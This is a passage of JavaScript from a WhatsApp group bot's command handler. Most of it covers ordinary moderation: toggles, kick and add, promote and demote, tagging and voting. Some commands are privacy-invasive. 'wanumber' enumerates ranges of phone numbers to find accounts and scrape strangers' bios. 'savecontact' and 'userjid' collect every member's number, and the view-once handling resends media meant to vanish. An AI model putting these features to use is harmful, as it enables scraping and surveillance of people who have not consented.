 return Yasam.sendFile(m.sender, buffer, 'media.jpg', msg[type].caption || '', m)
 }
}
break
 case 'antiviewonce':{
		 if (!m.isGroup) return replygcxeon (mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !YasamCreator) return replygcxeon(mess.botAdmin)
 if (args.length < 1) return replygcxeon('on/off?')
 if (args[0] === 'on') {
 db.data.chats[from].antiviewonce = true
 replygcxeon(`${command} is enabled`)
 } else if (args[0] === 'off') {
 db.data.chats[from].antiviewonce = false
 replygcxeon(`${command} is disabled`)
 }
 }
 break
 case 'antispam':{
		 if (!m.isGroup) return replygcxeon (mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !YasamCreator) return replygcxeon(mess.botAdmin)
 if (args.length < 1) return replygcxeon('on/off?')
 if (args[0] === 'on') {
 db.data.chats[from].antispam = true
 replygcxeon(`${command} is enabled`)
 } else if (args[0] === 'off') {
 db.data.chats[from].antispam = false
 replygcxeon(`${command} is disabled`)
 }
 }
 break

case 'antimedia':{
		 if (!m.isGroup) return replygcxeon (mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !YasamCreator) return replygcxeon(mess.botAdmin)
 if (args.length < 1) return replygcxeon('on/off?')
 if (args[0] === 'on') {
 db.data.chats[from].antimedia = true
 replygcxeon(`${command} is enabled`)
 } else if (args[0] === 'off') {
 db.data.chats[from].antimedia = false
 replygcxeon(`${command} is disabled`)
 }
 }
 break
 case 'antidocument':{
		 if (!m.isGroup) return replygcxeon (mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !YasamCreator) return replygcxeon(mess.botAdmin)
 if (args.length < 1) return replygcxeon('on/off?')
 if (args[0] === 'on') {
 db.data.chats[from].antidocument = true
 replygcxeon(`${command} is enabled`)
 } else if (args[0] === 'off') {
 db.data.chats[from].antidocument = false
 replygcxeon(`${command} is disabled`)
 }
 }
 break
 case 'anticontact':{
		 if (!m.isGroup) return replygcxeon (mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !YasamCreator) return replygcxeon(mess.botAdmin)
 if (args.length < 1) return replygcxeon('on/off?')
 if (args[0] === 'on') {
 db.data.chats[from].anticontact = true
 replygcxeon(`${command} is enabled`)
 } else if (args[0] === 'off') {
 db.data.chats[from].anticontact = false
 replygcxeon(`${command} is disabled`)
 }
 }
 break
 case 'antilocation':{
		 if (!m.isGroup) return replygcxeon (mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !YasamCreator) return replygcxeon(mess.botAdmin)
 if (args.length < 1) return replygcxeon('on/off?')
 if (args[0] === 'on') {
 db.data.chats[from].antilocation = true
 replygcxeon(`${command} is enabled`)
 } else if (args[0] === 'off') {
 db.data.chats[from].antilocation = false
 replygcxeon(`${command} is disabled`)
 }
 }
 break
 case 'antilink': {
 if (!m.isGroup) return replygcxeon (mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !YasamCreator) return replygcxeon(mess.botAdmin)
 if (args.length < 1) return replygcxeon('on/off?')
 if (args[0] === 'on') {
 db.data.chats[from].antilink = true
 replygcxeon(`${command} is enabled`)
 } else if (args[0] === 'off') {
 db.data.chats[from].antilink = false
 replygcxeon(`${command} is disabled`)
 }
 }
 break
 case 'antilinkgc': {
 if (!m.isGroup) return replygcxeon (mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !YasamCreator) return replygcxeon(mess.botAdmin)
 if (args.length < 1) return replygcxeon('on/off?')
 if (args[0] === 'on') {
 db.data.chats[from].antilinkgc = true
 replygcxeon(`${command} is enabled`)
 } else if (args[0] === 'off') {
 db.data.chats[from].antilinkgc = false
 replygcxeon(`${command} is disabled`)
 }
 }
 break
 case 'antipromotion': {
 if (!m.isGroup) return replygcxeon (mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !YasamCreator) return replygcxeon(mess.botAdmin)
 if (args.length < 1) return replygcxeon('on/off?')
 if (args[0] === 'on') {
 db.data.chats[from].antipromotion = true
 replygcxeon(`${command} is enabled`)
 } else if (args[0] === 'off') {
 db.data.chats[from].antipromotion = false
 replygcxeon(`${command} is disabled`)
 }
 }
 break
 case 'welcome':
 case 'left': {
 if (!m.isGroup) return replygcxeon (mess.group)
if (!isAdmins && !YasamCreator) return replygcxeon(mess.botAdmin)
 if (args.length < 1) return replygcxeon('on/off?')
 if (args[0] === 'on') {
 welcome = true
 replygcxeon(`${command} is enabled`)
 } else if (args[0] === 'off') {
 welcome = false
 replygcxeon(`${command} is disabled`)
 }
 }
 break
 case 'adminevent': {
 if (!m.isGroup) return replygcxeon (mess.group)
if (!isAdmins && !YasamCreator) return replygcxeon(mess.botAdmin)
 if (args.length < 1) return replygcxeon('on/off?')
 if (args[0] === 'on') {
 adminevent = true
 replygcxeon(`${command} is enabled`)
 } else if (args[0] === 'off') {
 adminevent = false
 replygcxeon(`${command} is disabled`)
 }
 }
 break
case 'groupevent': {
 if (!m.isGroup) return replygcxeon (mess.group)
if (!isAdmins && !YasamCreator) return replygcxeon(mess.botAdmin)
 if (args.length < 1) return replygcxeon('on/off?')
 if (args[0] === 'on') {
 groupevent = true
 replygcxeon(`${command} is enabled`)
 } else if (args[0] === 'off') {
 groupevent = false
 replygcxeon(`${command} is disabled`)
 }
 }
 break 
 case 'invite': {
	if (!m.isGroup) return replygcxeon (mess.group)
	if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!text) return replygcxeon(`Enter the number you want to invite to the group\n\nExample :\n*${prefix + command}* 916909137213`)
if (text.includes('+')) return replygcxeon(`Enter the number together without *+*`)
if (isNaN(text)) return replygcxeon(`Enter only the numbers plus your country code without spaces`)
let group = m.chat
let link = 'https://chat.whatsapp.com/' + await Yasam.groupInviteCode(group)
 await Yasam.sendMessage(text+'@s.whatsapp.net', {text: `≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`, mentions: [m.sender]})
 replygcxeon(` An invite link is sent to the user`) 
}
break
 case 'closetime':
 if (!m.isGroup) return replygcxeon (mess.group)
 if (!isAdmins && !YasamCreator) return replygcxeon(mess.botAdmin)
 if (!isBotAdmins) return replygcxeon(mess.botAdmin)
 if (args[1] == 'second') {
 var timer = args[0] * `1000`
 } else if (args[1] == 'minute') {
 var timer = args[0] * `60000`
 } else if (args[1] == 'hour') {
 var timer = args[0] * `3600000`
 } else if (args[1] == 'day') {
 var timer = args[0] * `86400000`
 } else {
 return replygcxeon('*select:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
 }
 replygcxeon(`Close time ${q} starting from now`)
 setTimeout(() => {
 var nomor = m.participant
 const close = `*Close time* group closed by admin\nnow only admin can send messages`
 Yasam.groupSettingUpdate(m.chat, 'announcement')
 replygcxeon(close)
 }, timer)
 break
 case 'opentime':
 if (!m.isGroup) return replygcxeon (mess.group)
 if (!isAdmins && !YasamCreator) return replygcxeon(mess.admin)
 if (!isBotAdmins) return replygcxeon(mess.botAdmin)
 if (args[1] == 'second') {
 var timer = args[0] * `1000`
 } else if (args[1] == 'minute') {
 var timer = args[0] * `60000`
 } else if (args[1] == 'hour') {
 var timer = args[0] * `3600000`
 } else if (args[1] == 'day') {
 var timer = args[0] * `86400000`
 } else {
 return replygcxeon('*select:*\nsecond\nminute\nhour\n\n*example*\n10 second')
 }
 replygcxeon(`Open time ${q} starting from now`)
 setTimeout(() => {
 var nomor = m.participant
 const open = `*Open time* the group was opened by admin\n now members can send messages`
 Yasam.groupSettingUpdate(m.chat, 'not_announcement')
 replygcxeon(open)
 }, timer)
 break
 case 'kick':
 if (!isAdmins && !isGroupOwner && !YasamCreator) return replygcxeon(mess.botAdmin)
 if (!m.isGroup) return replygcxeon (mess.group)
 if (!isAdmins && !isGroupOwner && !YasamCreator) return replygcxeon(mess.botAdmin)
 if (!isBotAdmins) return replygcxeon(mess.botAdmin)
 let blockwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 await Yasam.groupParticipantsUpdate(m.chat, [blockwww], 'remove')
 replygcxeon(mess.done)
 break

case 'wanumber': case 'nowa': case 'searchno': case 'searchnumber':{
 	if (!text) return replygcxeon(`Provide Number with last number x\n\nExample: ${prefix + command} 91690913721x`)
var inputnumber = text.split(" ")[0]
 
 replygcxeon(`Searching for WhatsApp account in given range...`)
 function countInstances(string, word) {
 return string.split(word).length - 1
 }
 var number0 = inputnumber.split('x')[0]
 var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
 var random_length = countInstances(inputnumber, 'x')
 var randomxx
 if (random_length == 1) {
 randomxx = 10
 } else if (random_length == 2) {
 randomxx = 100
 } else if (random_length == 3) {
 randomxx = 1000
 }
 var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`
 var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
 var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
 for (let i = 0; i < randomxx; i++) {
 var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
 var status1 = nu[Math.floor(Math.random() * nu.length)]
 var status2 = nu[Math.floor(Math.random() * nu.length)]
 var status3 = nu[Math.floor(Math.random() * nu.length)]
 var dom4 = nu[Math.floor(Math.random() * nu.length)]
 var random21
 if (random_length == 1) {
 random21 = `${status1}`
 } else if (random_length == 2) {
 random21 = `${status1}${status2}`
 } else if (random_length == 3) {
 random21 = `${status1}${status2}${status3}`
 } else if (random_length == 4) {
 random21 = `${status1}${status2}${status3}${dom4}`
 }
 var anu = await Yasam.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
 var anuu = anu.length !== 0 ? anu : false
 try {
 try {
 var anu1 = await Yasam.fetchStatus(anu[0].jid)
 } catch {
 var anu1 = '401'
 }
 if (anu1 == '401' || anu1.status.length == 0) {
 nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
 } else {
 text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Asia/Kolkata').format('HH:mm:ss DD/MM/YYYY')}\n\n`
 }
 } catch {
 nowhatsapp += `${number0}${i}${number1}\n`
 }
 }
 replygcxeon(`${text66}${nobio}${nowhatsapp}`)
 }
break
case 'getcontact': case 'getcon': {
if (!m.isGroup) return replygcxeon (mess.group)
if (!(isGroupAdmins || YasamCreator)) return replygcxeon(mess.botAdmin)
xeonbigpp = await Yasam.sendMessage(m.chat, {
 text: `\nGroup: *${groupMetadata.subject}*\nMember: *${participants.length}*`
}, {quoted: fvrif, ephemeralExpiration: 86400})
await sleep(1000)
Yasam.sendContact(m.chat, participants.map(a => a.id), xeonbigpp)
}
break
case 'savecontact': case 'svcontact':{
if (!m.isGroup) return replygcxeon (mess.group)
if (!(isGroupAdmins || YasamCreator)) return replygcxeon(mess.botAdmin)
let cmiggc = await Yasam.groupMetadata(m.chat)
let orgiggc = participants.map(a => a.id)
vcard = ''
noPort = 0
for (let a of cmiggc.participants) {
 vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
}
let nmfilect = './contacts.vcf'
replygcxeon('\nBe patient bro, saving... '+cmiggc.participants.length+' contact')
require('fs').writeFileSync(nmfilect, vcard.trim())
await sleep(2000)
Yasam.sendMessage(m.chat, {
 document: require('fs').readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: '\nSucceed\nGroup: *'+cmiggc.subject+'*\nContact: *'+cmiggc.participants.length+'*'
}, {ephemeralExpiration: 86400, quoted: fvrif})
require('fs').unlinkSync(nmfilect)
}
break
case 'sendcontact': case 'sencontact': {
if (!m.isGroup) return replygcxeon (mess.group)
if (!m.mentionedJid[0]) return replygcxeon('\nUse like this\n Example:.sendcontact @tag|name')
let snTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
let snContact = {
	displayName: "Contact", contacts: [{displayName: snTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+snTak+";;;\nFN:"+snTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Mobile\nEND:VCARD"}]
}
Yasam.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})
}
break
case 'contacttag': case 'contag':{
if (!m.isGroup) return replygcxeon (mess.group)
if (!(isGroupAdmins || YasamCreator)) return replygcxeon(mess.botAdmin)
if (!m.mentionedJid[0]) return replygcxeon('\nUse like this\n Example:.contacttag @tag|name')
let sngTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
let sngContact = {
	displayName: "Contact", contacts: [{displayName: sngTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+sngTak+";;;\nFN:"+sngTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Mobile\nEND:VCARD"}]
}
Yasam.sendMessage(m.chat, {contacts: sngContact, mentions: participants.map(a => a.id)}, {ephemeralExpiration: 86400})
}
break
 case 'add': {
				if (!m.isGroup) return replygcxeon(mess.group);
				if (!isAdmins && !YasamCreator) return replygcxeon(mess.admin);
				if (!isBotAdmins) return replygcxeon(mess.botAdmin);

				if (!text && !m.quoted) {
					replygcxeon(`Example: ${prefix + command} 62xxx`);
				} else {
					const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender;
					try {
						await Yasam.groupParticipantsUpdate(m.chat, [numbersOnly], 'add')
							.then(async (res) => {
								for (let i of res) {
									let invv = await Yasam.groupInviteCode(m.chat);
						
									if (i.status == 408) return replygcxeon('Oh no, sepertinya user baru saja keluar dari grup ini! 😔');
									if (i.status == 401) return replygcxeon('Aduh, usernya kayaknya ngeblok bot ini deh! 😢');
									if (i.status == 409) return replygcxeon('Wah, user ini udah masuk grup! 🎉');
									if (i.status == 500) return replygcxeon('Maaf, grup ini sudah penuh! 😞');
									if (i.status == 403) {
										await Yasam.sendMessage(m.chat, { 
											text: `@${numbersOnly.split('@')[0]} Gak bisa ditambahin nih\n\nKarena targetnya private banget! 😅\n\nTapi, undangannya bakal dikirim ke\n-> wa.me/${numbersOnly.replace(/\D/g, '')}\nLewat chat pribadi ya!`, 
											mentions: [numbersOnly] 
										}, { quoted: m });
							
										await Yasam.sendMessage(`${numbersOnly ? numbersOnly : creator}`, { 
											text: `${'https://chat.whatsapp.com/' + invv}\n------------------------------------------------------\n\nAdmin: wa.me/${m.sender}\nUndang kamu ke grup ini\nAyo masuk kalau mau ya! 🙇`, 
											detectLink: true, 
											mentions: [numbersOnly] 
										}, { quoted: floc2 }).catch((err) => replygcxeon('Gagal kirim undangan! 😔'));
									} else {
										replygcxeon(mess.done);
									}
								}
							});
					} catch (e) {
						replygcxeon('Gagal nambahin usernya nih, ada yang salah! 😢');
					}
				}
			}
			break;
 case 'promote':
 if (!m.isGroup) return replygcxeon (mess.group)
 if (!isAdmins && !isGroupOwner && !YasamCreator) return replygcxeon(mess.botAdmin)
 if (!isBotAdmins) return replygcxeon(mess.botAdmin)
 let blockwwwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 await Yasam.groupParticipantsUpdate(m.chat, [blockwwwww], 'promote')
 replygcxeon(mess.done)
 break
 case 'demote':
 if (!m.isGroup) return replygcxeon (mess.group)
 if (!isAdmins && !isGroupOwner && !YasamCreator) return replygcxeon(mess.botAdmin)
 if (!isBotAdmins) return replygcxeon(mess.botAdmin)
 let blockwwwwwa = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 await Yasam.groupParticipantsUpdate(m.chat, [blockwwwwwa], 'demote')
 replygcxeon(mess.done)
 break
 case 'setnamegc':
 case 'setsubject':
 if (!m.isGroup) return replygcxeon (mess.group)
 if (!isAdmins && !isGroupOwner && !YasamCreator) return replygcxeon(mess.botAdmin)
 if (!isBotAdmins) return replygcxeon(mess.botAdmin)
 if (!text) return replygcxeon('Text ?')
 await Yasam.groupUpdateSubject(m.chat, text)
 replygcxeon(mess.done)
 break
 case 'userjid':{
 	if(!YasamCreator) return replygcxeon (mess.owner)
 const groupMetadata = m.isGroup ? await Yasam.groupMetadata(m.chat).catch((e) => {}) : ""
		const participants = m.isGroup ? await groupMetadata.participants : ""
 let textt = `_Here is jid address of all users of_\n *- ${groupMetadata.subject}*\n\n`
 for (let mem of participants) {
 textt += `${themeemoji} ${mem.id}\n`
 }
 replygcxeon(textt)
 }
 break
 case 'creategc': {
				if (!YasamCreator) return replygcxeon(mess.owner);
				if (!text) {
					return replygcxeon(`Uhm, cara pakainya : ${prefix + command} Sekolah Menjadi Anime, Kak! 😊`);
				}
				await emote('⏱️');
				let cret = await Yasam.groupCreate(text, []);
				let response = await Yasam.groupInviteCode(cret.id);
				let caption = `Buka tautan ini untuk bergabung ke grup WhatsApp saya, Kak: https://chat.whatsapp.com/${response}`.trim();
				await emote('✅');
				Yasam.sendMessage(m.chat, {
					text: caption,
					contextInfo: {
						forwardingScore: 1,
						isForwarded: true,
						externalAdReply: {
							showAdAttribution: true,
							title: cret.subject,
							body: `Undangan chat grup`,
							thumbnailUrl: thumbUrl,
							sourceUrl: `https://chat.whatsapp.com/${response}`,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				});
			}
			break;
 case 'setbotbio':{
if (!YasamCreator) return replygcxeon (mess.owner)
if (!text) return replygcxeon(`Where is the text?\nExample: ${prefix + command} Cheems Bot`)
 await Yasam.updateProfileStatus(text)
 replygcxeon(`Success in changing the bio of bot's number`)
 }
 break
 case 'deleteppgroup': case 'delppgc': case 'deleteppgc': case 'delppgroup': {
if (!m.isGroup) return replygcxeon (mess.group)
if (!isAdmins && !YasamCreator) return replygcxeon(mess.botAdmin)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
 await Yasam.removeProfilePicture(from)
 }
 break
 case 'deleteppbot': case 'delppbot': {
if (!YasamCreator) return replygcxeon (mess.owner)
 await Yasam.removeProfilePicture(Yasam.user.id)
 replygcxeon(`Success in deleting bot's profile picture`)
 }
 break
 case 'setdesc':
 case 'setdesk':
 if (!m.isGroup) return replygcxeon (mess.group)
 if (!isAdmins && !isGroupOwner && !YasamCreator) return replygcxeon(mess.botAdmin)
 if (!isBotAdmins) return replygcxeon(mess.botAdmin)
 if (!text) return replygcxeon('Text ?')
 await Yasam.groupUpdateDescription(m.chat, text)
 replygcxeon(mess.done)
 break
 case 'setppgroup':
 case 'setppgrup':
 case 'setppgc':
 case 'setgrouppp':
 case 'setgruppp':
 case 'setgcpp':
 if (!m.isGroup) return replygcxeon (mess.group)
 if (!isAdmins) return replygcxeon(mess.admin)
 if (!isBotAdmins) return replygcxeon(mess.botAdmin)
 if (!quoted) return replygcxeon(`Kirim/Balas Gambar Dengan Caption ${prefix + command}`)
 if (!/image/.test(mime)) return replygcxeon(`Send/Reply Image Caption Caption ${prefix + command}`)
 if (/webp/.test(mime)) return replygcxeon(`Kirim/Balas Gambar Dengan Caption ${prefix + command}`)
 var medis = await Yasam.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
 if (args[0] == 'full') {
 var {
 img
 } = await generateProfilePicture(medis)
 await Yasam.query({
 tag: 'iq',
 attrs: {
 to: m.chat,
 type: 'set',
 xmlns: 'w:profile:picture'
 },
 content: [{
 tag: 'picture',
 attrs: {
 type: 'image'
 },
 content: img
 }]
 })
 fs.unlinkSync(medis)
 replygcxeon(mess.done)
 } else {
 var memeg = await Yasam.updateProfilePicture(m.chat, {
 url: medis
 })
 fs.unlinkSync(medis)
 replygcxeon(mess.done)
 }
 break
 case 'tagall':
 case 'tag':
 if (!m.isGroup) return replygcxeon (mess.group)
 if (!isAdmins && !isGroupOwner && !YasamCreator) return replygcxeon(mess.botAdmin)
 if (!isBotAdmins) return replygcxeon(mess.botAdmin)
 let me = m.sender
 let teks = `╚»˙·٠${themeemoji}●♥ Tag All ♥●${themeemoji}٠·˙«╝\n😶 *Tagger :* @${me.split('@')[0]}\n🌿 *Message : ${q ? q : 'no message'}*\n\n`
 for (let mem of participants) {
 teks += `${themeemoji} @${mem.id.split('@')[0]}\n`
 }
 Yasam.sendMessage(m.chat, {
 text: teks,
 mentions: participants.map(a => a.id)
 }, {
 quoted: fvrif
 })
 break
 case 'kickall': {
 if (!m.isGroup) return replygcxeon (mess.group)
 if (!isAdmins && !isGroupOwner && !YasamCreator) return replygcxeon(mess.botAdmin)
 if (!isBotAdmins) return replygcxeon(mess.botAdmin)
 const xeonkickall = (args[0] === 'numBut')
 ? text.replace(`${args[0]} `, '').split('|')
 : (Number(args[0]))
 ? groupMetadata.participants
 .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
 .map(item => item.id)
 : groupMetadata.participants
 .filter(item => item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
 .map(item => item.id);
 if (global.welcome === true) {
 welcome = false;
 }
 for (let remove of xeonkickall) {
 await Yasam.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${remove}@s.whatsapp.net` : remove], "remove");
 await sleep(100);
 }
 replygcxeon(`Success`);
}
break
case 'promoteall': {
 if (!m.isGroup) return replygcxeon (mess.group)
 if (!isAdmins && !isGroupOwner && !YasamCreator) return replygcxeon(mess.botAdmin)
 if (!isBotAdmins) return replygcxeon(mess.botAdmin)
 const xeonpromoteall = (args[0] === 'numBut')
 ? text.replace(`${args[0]} `, '').split('|')
 : (Number(args[0]))
 ? groupMetadata.participants
 .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
 .map(item => item.id)
 : groupMetadata.participants
 .filter(item => item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
 .map(item => item.id);
 for (let promote of xeonpromoteall) {
 await Yasam.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${promote}@s.whatsapp.net` : promote], "promote");
 await sleep(100);
 }
 replygcxeon(`Success`);
}
break
case 'demoteall': {
 if (!m.isGroup) return replygcxeon (mess.group)
 if (!isAdmins && !isGroupOwner && !YasamCreator) return replygcxeon(mess.botAdmin)
 if (!isBotAdmins) return replygcxeon(mess.botAdmin)
 const xeondemoteall = (args[0] === 'numBut')
 ? text.replace(`${args[0]} `, '').split('|')
 : (Number(args[0]))
 ? groupMetadata.participants
 .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
 .map(item => item.id)
 : groupMetadata.participants
 .filter(item => item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
 .map(item => item.id);
 for (let demote of xeondemoteall) {
 await Yasam.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${demote}@s.whatsapp.net` : demote], "demote");
 await sleep(100);
 }
 replygcxeon(`Success`);
}
break
 case 'hidetag':
 if (!m.isGroup) return replygcxeon (mess.group)
 if (!isAdmins && !isGroupOwner && !YasamCreator) return replygcxeon(mess.botAdmin)
 if (!isBotAdmins) return replygcxeon(mess.botAdmin)
 Yasam.sendMessage(m.chat, {
 text: q ? q : '',
 mentions: participants.map(a => a.id)
 }, {
 quoted: fvrif
 })
 break
 case 'totag':
 if (!m.isGroup) return replygcxeon (mess.group)
 if (!isBotAdmins) return replygcxeon(mess.botAdmin)
 if (!isAdmins) return replygcxeon(mess.admin)
 if (!m.quoted) return replygcxeon(`Reply media with caption ${prefix + command}`)
 Yasam.sendMessage(m.chat, {
 forward: m.quoted.fakeObj,
 mentions: participants.map(a => a.id)
 })
 break
 case 'group':
			case 'grup': {
				if (!m.isGroup) return replygcxeon(mess.group);
				if (!isAdmins && !isGroupOwner && !YasamCreator) return replygcxeon(mess.admin);
				if (!isBotAdmins) return replygcxeon(mess.botAdmin);
				if (args[0] === 'close') {
					await Yasam.groupSettingUpdate(m.chat, 'announcement')
						.then(() => replygcxeon('✅ Grup berhasil ditutup, hanya admin yang bisa mengirim pesan sekarang! 🔒'))
						.catch((err) => replygcxeon(`⚠️ Gagal menutup grup: ${err}`));
				} else if (args[0] === 'open') {
					await Yasam.groupSettingUpdate(m.chat, 'not_announcement')
						.then(() => replygcxeon('✅ Grup berhasil dibuka, semua anggota bisa mengirim pesan sekarang! 🔓'))
						.catch((err) => replygcxeon(`⚠️ Gagal membuka grup: ${err}`));
				} else {
					replygcxeon(`⚙️ Penggunaan perintah:\n- *${prefix + command} open* → Buka grup\n- *${prefix + command} close* → Tutup grup`);
				}
			}
			break;

case 'editinfo': {
				if (!m.isGroup) return replygcxeon(mess.group);
				if (!isAdmins && !isGroupOwner && !YasamCreator) return replygcxeon(mess.admin);
				if (!isBotAdmins) return replygcxeon(mess.botAdmin);
				if (args[0] === 'open') {
					await Yasam.groupSettingUpdate(m.chat, 'unlocked')
						.then(() => replygcxeon('✅ Anggota sekarang bisa mengedit info grup! 📛✨'))
						.catch((err) => replygcxeon(`⚠️ Gagal membuka izin edit info grup: ${err}`));
				} else if (args[0] === 'close') {
					await Yasam.groupSettingUpdate(m.chat, 'locked')
						.then(() => replygcxeon('✅ Hanya admin yang bisa mengedit info grup sekarang! 🔒🛡️'))
						.catch((err) => replygcxeon(`⚠️ Gagal menutup izin edit info grup: ${err}`));
				} else {
					replygcxeon(`⚙️ Penggunaan perintah:\n- *${prefix + command} open* → Izinkan anggota mengedit info grup\n- *${prefix + command} close* → Hanya admin yang bisa mengedit info grup`);
				}
			}
			break;

			case 'linkgroup':
			case 'linkgrup':
			case 'linkgc':
			case 'gclink':
			case 'grouplink':
			case 'gruplink':
				if (!m.isGroup) return replygcxeon(mess.group);
				if (!isAdmins && !isGroupOwner && !YasamCreator) return replygcxeon(mess.admin);
				if (!isBotAdmins) return replygcxeon(mess.botAdmin);
				let response = await Yasam.groupInviteCode(m.chat)
				Yasam.sendText(m.chat, `👥 *GROUP LINK*\n📛 *Name :* ${groupMetadata.subject}\n👤 *Owner Grup :* ${groupMetadata.owner !== undefined ? '+'+ groupMetadata.owner.split`@`[0] : 'Not known'}\n🌱 *ID :* ${groupMetadata.id}\n🔗 *Chat Link :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${groupMetadata.participants.length}\n`, m, {
					detectLink: true
				})
			break;
			case 'getbio': {
 try {
 let who
 if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
 else who = m.quoted.sender ? m.quoted.sender : m.sender
 let bio = await Yasam.fetchStatus(who)
 replygcxeon(bio.status)
 } catch {
 if (text) return replygcxeon(`bio is private or you haven't replied to the person's message!`)
 else try {
 let who = m.quoted ? m.quoted.sender : m.sender
 let bio = await Yasam.fetchStatus(who)
 replygcxeon(bio.status)
 } catch {
 return replygcxeon(`bio is private or you haven't replied to the person's message!`)
 }
 }
}
break
 break
 case 'vote': {
 if (!m.isGroup) return replygcxeon (mess.group)
 if (m.chat in vote) return replygcxeon(`_There are still votes in this chat!_\n\n*${prefix}deletevote* - to delete votes`)
 if (!text) return replygcxeon(`Enter Reason for Vote, Example: *${prefix + command} Handsome Owner*`)
 replygcxeon(`Voting starts!\n\n*${prefix}upvote* - for upvote\n*${prefix}downvote* - for downvote\n*${prefix}checkvote* - to check the vote\n*${prefix}deletevote* - to delete vote`)
 vote[m.chat] = [q, [], []]
 await sleep(1000)
 upvote = vote[m.chat][1]
 devote = vote[m.chat][2]
 teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

Please Type Below
*${prefix}upvote* - to cast vote
*${prefix}downvote* - to downvote
*${prefix}deletevote* - to delete vote`
 Yasam.sendMessage(m.chat, {text: teks_vote}, {quoted:m})
	 }
 break
 case 'upvote': {
 if (!m.isGroup) return replygcxeon (mess.group)
 if (!(m.chat in vote)) return replygcxeon(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
 isVote = vote[m.chat][1].concat(vote[m.chat][2])
 wasVote = isVote.includes(m.sender)
 if (wasVote) return replygcxeon('You have Voted')
 vote[m.chat][1].push(m.sender)
 menvote = vote[m.chat][1].concat(vote[m.chat][2])
 teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* - to downvote
*${prefix}deletevote* - to delete vote`
 Yasam.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	 }
 break
 case 'downvote': {
 if (!m.isGroup) return replygcxeon (mess.group)
 if (!(m.chat in vote)) return replygcxeon(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
